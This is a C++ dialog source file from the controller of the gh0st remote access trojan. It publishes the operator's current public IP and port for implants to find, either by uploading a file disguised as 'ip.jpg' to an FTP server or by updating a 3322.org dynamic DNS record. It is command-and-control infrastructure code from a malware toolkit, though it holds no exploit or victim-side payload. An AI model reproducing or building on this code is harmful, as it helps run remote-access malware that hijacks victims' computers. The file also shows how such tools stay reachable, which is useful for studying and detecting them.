// UpipDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include <atlbase.h>
#include "UpipDlg.h"
#include "BuildServerDlg.h"
#include "MainFrm.h"
#include <winsock2.h>
#include <wininet.h>
#pragma comment(lib,"WS2_32")
#pragma comment (lib,"Wininet.lib") 
#include "afxinet.h" //WinInet所需要的头文件
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CUpipDlg dialog


CUpipDlg::CUpipDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CUpipDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUpipDlg)
	m_FtpIP = _T("");
	m_FtpPort = 21;
	m_Pass = _T("");
	m_User = _T("");
	m_Dns= _T("");
	m_DnsId= _T("");
	m_DnsPass= _T("");
	m_FtpUrl = _T("ip.jpg");
	m_bFirstShow = true;
	//}}AFX_DATA_INIT
//	m_pCBuildServerDlg= pCBuildServerDlg;
}


void CUpipDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUpipDlg)
	DDX_Text(pDX, IDC_FTPIP, m_FtpIP);
	DDX_Text(pDX, IDC_FTPPORT, m_FtpPort);
	DDX_Text(pDX, IDC_PASS, m_Pass);
	DDX_Text(pDX, IDC_USER, m_User);
	DDX_Text(pDX, IDC_FTPURL, m_FtpUrl);
	DDX_Text(pDX, IDC_LOCALPORT, m_YourPort);
	
	DDX_Text(pDX, IDC_DNS, m_Dns);
	DDX_Text(pDX, IDC_DNSID, m_DnsId);
	DDX_Text(pDX, IDC_DNSPASS, m_DnsPass);
	
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUpipDlg, CDialogEx)
	//{{AFX_MSG_MAP(CUpipDlg)
	ON_BN_CLICKED(IDC_UPFTP, OnUpftp)
	ON_BN_CLICKED(IDC_UPDNSIP, OnUpdnsip)
	ON_BN_CLICKED(IDC_BUTTON_GET, OnButtonGet)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUpipDlg message handlers

BOOL CUpipDlg::OnInitDialog() 
{
	CDialogEx::OnInitDialog();

	CString str;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2),&wsaData);
	char szhostname[128];
	
		if (m_bFirstShow)
	{
		UpdateData(false);
		GetDlgItem(IDC_LOCALPORT)->SetWindowText(_T("80"));
		GetDlgItem(IDC_LOCALIP)->SetWindowText(str);
		GetDlgItem(IDC_IP)->SetWindowText(str);

		SetDlgItemText(IDC_DNS, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("3322"), _T("DNS"), m_Dns));
		SetDlgItemText(IDC_DNSID, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("3322"), _T("ID"), m_DnsId));
		SetDlgItemText(IDC_DNSPASS, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("3322"), _T("PassWord"), m_DnsPass));


		SetDlgItemText(IDC_FTPIP, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("FTP"), _T("FTP"), ""));
		SetDlgItemText(IDC_FTPURL, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("FTP"), _T("IpFile"), ""));
		SetDlgItemText(IDC_FTPPORT, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("FTP"), _T("FtpPort"), ""));
		SetDlgItemText(IDC_LOCALPORT, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("FTP"), _T("YourPort"), ""));
		SetDlgItemText(IDC_USER, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("FTP"), _T("UserName"), ""));
		SetDlgItemText(IDC_PASS, 
				((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("FTP"), _T("PassWord"), ""));
	}
//	OnButtonGet() ;
	
	
	if( gethostname(szhostname, 128) == 0 )
	{
		struct hostent * phost;
		int i=0,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( j = 0; j<h_length; j++ )
		{
			CString addr;			
			if( j > 0 )
				str += _T(".");			
			addr.Format(_T("%u"), (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
			str += addr;
		}
	}
	//m_sIPAddress=str;

	WSACleanup();
	//---------------------------
//	GetDlgItem(IDC_FTPPORT)->SetWindowText("21");


	m_bFirstShow = false;
//	UpdateData(FALSE);
	return true;
}


void CUpipDlg::OnUpftp() 
{
	// TODO: Add your control notification handler code here
		UpdateData(TRUE);

	//打包本地IP及端口信息为文件------------------
	CString ip,str;
	GetDlgItem(IDC_LOCALIP)->GetWindowText(ip);
	GetDlgItem(IDC_LOCALPORT)->GetWindowText(str);
	ip=ip+_T(":")+str;
	HANDLE hFile;
	hFile = CreateFile(_T("ip.txt"), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD numWrite;
	WriteFile (hFile,ip,ip.GetLength(), &numWrite, NULL);	
	CloseHandle(hFile);

	//FTP上传文件---------------------------------
	CInternetSession *seu;
	CFtpConnection *pFTP;
	   //新建对话
	seu=new CInternetSession(AfxGetAppName(),1,PRE_CONFIG_INTERNET_ACCESS);
	try 
	{ 
		//新建连接对象
		pFTP=seu->GetFtpConnection(m_FtpIP,m_User,m_Pass,m_FtpPort,FALSE); 
	} 
	catch(CInternetException *pEx) 
	{
		//获取错误
		TCHAR szError[1024];
		if(pEx->GetErrorMessage(szError,1024))
			AfxMessageBox(szError);
		else  
			AfxMessageBox(_T("There was an exception"));
		pEx->Delete();
		pFTP=NULL;
		return;
	}
	   //上传
	if(pFTP->PutFile(_T("ip.txt"),m_FtpUrl))
			AfxMessageBox(_T("刷新IP成功！"));
	pFTP->Close();	

	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("FTP"), _T("FTP"), m_FtpIP);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("FTP"), _T("IpFile"), m_FtpUrl);
	//((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("FTP"), _T("FtpPort"), m_FtpPort);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("FTP"), _T("YourPort"), m_YourPort);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("FTP"), _T("UserName"), m_User);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("FTP"), _T("PassWord"), m_Pass);
}

void CUpipDlg::OnUpdnsip() 
{
	// TODO: Add your control notification handler code here
	CString id,pass,dns,ip; 
	TCHAR a[256]=_T("http://");
	TCHAR *b=_T("@members.3322.org/dyndns/update?system=dyndns&hostname=");
	TCHAR *c=_T("&myip=");
	TCHAR *d=_T("&wildcard=OFF");
	GetDlgItem(IDC_DNSID)->GetWindowText(id);
	GetDlgItem(IDC_DNSPASS)->GetWindowText(pass);
	GetDlgItem(IDC_DNS)->GetWindowText(dns);
	GetDlgItem(IDC_IP)->GetWindowText(ip);
	lstrcat(a,id);
	lstrcat(a,_T(":"));
	lstrcat(a,pass);
	lstrcat(a,b);
	lstrcat(a,dns);
	lstrcat(a,c);
	lstrcat(a,ip);
	lstrcat(a,d);
  
//	 MessageBox(a);


/*
//"http://xxxx:xxxxx@members.3322.org/dyndns/update?system=dyndns&hostname=xxxxx.3322.org&myip=192.168.0.1&wildcard=OFF"; 

	HINTERNET hNet = ::InternetOpen(_T("3322"), //当HTTP协议使用时，这个参数随意赋值 
	PRE_CONFIG_INTERNET_ACCESS, //访问类型指示Win32网络函数使用登记信息去发现一个服务器。 
	NULL, 
	INTERNET_INVALID_PORT_NUMBER, //使用INTERNET_INVALID_PORT_NUMBER相当于提供却省的端口数。 
	0 //标志去指示使用返回句句柄的将来的Internet函数将"不"为回调函数发送状态信息 
	) ; 

	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //从InternetOpen返回的句柄 
	(TCHAR *)a, //需要打开的URL 
	NULL, //用来向服务器传送额外的信息,一般为NULL 
	0, //用来向服务器传送额外的信息,一般为 0 
	INTERNET_FLAG_RELOAD, //InternetOpenUrl行为的标志 
	0) ; //信息将不会被送到状态回调函数 

	TCHAR buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl返回的句柄 
	buffer, //保留数据的缓冲区 
	sizeof(buffer), 
	&dwBytesRead); //指向包含读入缓冲区字节数的变量的指针; 
	//如果返回值是TRUE，而且这里指向0，则文件已经读到了文件的末尾。 

	::InternetCloseHandle(hUrlFile) ; 
	::InternetCloseHandle(hNet) ; 

		if(buffer>0)
		{
#ifdef _UNICODE
			if(wcsstr(buffer,_T("badauth")))
				MessageBox(_T("id 或 pass错误!"));
			if(wcsstr(buffer,_T("good")))
				MessageBox(_T("更新成功!\r\n"+ip));
			if(wcsstr(buffer,_T("nohost")))
				MessageBox(_T("dns错误!\n\r请检查是否输入正确"));
			if(wcsstr(buffer,_T("nochg")))
				MessageBox(_T("反复更新"));
#else

			if(strstr(buffer,"badauth"))
				MessageBox(_T("id 或 pass错误!"));
			if(strstr(buffer,"good"))
				MessageBox(_T("更新成功!\r\n"+ip));
			if(strstr(buffer,"nohost"))
				MessageBox(_T("dns错误!\n\r请检查是否输入正确"));
			if(strstr(buffer,"nochg"))
				MessageBox(_T("反复更新"));
#endif

		}
	memset(buffer,0,sizeof(buffer));
*/
	CString strRet;
	CInternetSession m_Session(NULL,0);
	CHttpFile* pHttpFile=NULL;
	pHttpFile=(CHttpFile*) m_Session.OpenURL(a);

	if(pHttpFile == NULL)
	{
		MessageBox(_T("更新失败"),_T("3322域名更新"));
		m_Session.Close();
		return;
	}
	
	pHttpFile->ReadString(strRet);
	
	pHttpFile->Close();
	m_Session.Close();

	
	USES_CONVERSION;
	MessageBox(A2T((LPSTR)(LPCTSTR)strRet),_T("3322域名更新"));		

	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("3322"), _T("DNS"), dns);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("3322"), _T("ID"), id);
	((Cgh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("3322"), _T("PassWord"), m_DnsPass);
}


CString getLocalIpAddress()
{ 
	CInternetSession session; //声明该对象为获取网页属性做准备
	CHttpFile *pFile=NULL; 
	CString str,ch;
	
	CString m_szSite=_T("http://www.zu14.cn/ip/"); //该地址是获取外网IP的关键，原理就是通过该地址来获取外网IP的
	try
	{
		pFile=(CHttpFile*)session.OpenURL(m_szSite);
	} //打开该地址
	catch(CInternetException *pEx) //错误处理
	{
		pFile=NULL;
		pEx->Delete();
	}
	if(pFile)
	{
		while(pFile->ReadString(str)) //读入该字符串
		{
			ch+=str+_T("\r\n");
		}
		pFile->Close();
		pFile=NULL;
		delete pFile;
	}
	else
	{
		ch+=_T("");
	}

	return ch;//返回公网IP地址 
}

void CUpipDlg::OnButtonGet()
{
	GetDlgItem(IDC_STATIC2)->SetWindowText(_T("正在获取，请稍等......"));
	TCHAR szIP[128] ;
	wsprintf(szIP,_T("%s"),getLocalIpAddress());
	
	GetDlgItem(IDC_STATIC2)->SetWindowText(_T("获取完毕"));
	SetDlgItemText(IDC_IP,szIP);
	SetDlgItemText(IDC_LOCALIP,szIP);
} 

/*
void CUpipDlg::OnButtonGet1() 
{
	char aaa[128] ;
	sprintf(aaa,"%s",getLocalIpAddress());
	MessageBoxA(NULL,aaa,NULL,NULL);
	// TODO: Add your control notification handler code here
	char IpFile[MAX_PATH];
	GetTempPathA(sizeof(IpFile),IpFile);
	strcat(IpFile,"\\ip.tmp");
	
	CString SiteInfo,SiteName="http://www.ip138.com/ips8.asp";
	CInternetSession mySession(NULL,0);
	CHttpFile *myHttpFile=NULL;
	CString myData;
	myHttpFile=(CHttpFile *)mySession.OpenURL(SiteName);
	FILE *pFile;
	pFile=fopen("c:\\1s.txt","w");
	while(myHttpFile->ReadString(myData))
	{
		SiteInfo=SiteInfo+"\r\n";
		SiteInfo+=myData;
		fwrite(SiteInfo,1,SiteInfo.GetLength(),pFile);
		SiteInfo="";
	}
	myHttpFile->Close();
	mySession.Close();
	fclose(pFile);

	GetDlgItem(IDC_STATIC2)->SetWindowText(_T("正在获取，请稍等......"));
	
	CFile file;
#ifdef _UNICODE
	TCHAR wIpFile[MAX_PATH];
	MultiByteToWideChar( CP_ACP, 0, IpFile, -1, wIpFile, sizeof(wIpFile) / sizeof(wIpFile[0]));
	file.Open(L"c:\\1s.txt",CFile::modeRead);
	OutputDebugString(wIpFile);
#else
	file.Open(IpFile,CFile::modeRead);
#endif
	CString data;
	while(file.ReadHuge(data.GetBuffer(1024),1024))
	{
		CString yourIP("您的IP地址是：");
		CString end("来自");
		int index=data.Find(yourIP);
		if(index!=-1)
		{
			int length=data.Find(end)-index;
			GetDlgItem(IDC_STATIC1)->SetWindowText(data.Mid(index,length));
			GetDlgItem(IDC_STATIC2)->SetWindowText(_T("获取完毕"));
			SetDlgItemText(IDC_IP,data.Mid(index+15,length-17));
			SetDlgItemText(IDC_LOCALIP,data.Mid(index+15,length-17));
			break;
		}
		data.ReleaseBuffer(1024);
	}
	file.Close();
	DeleteFileA(IpFile);
	
}*/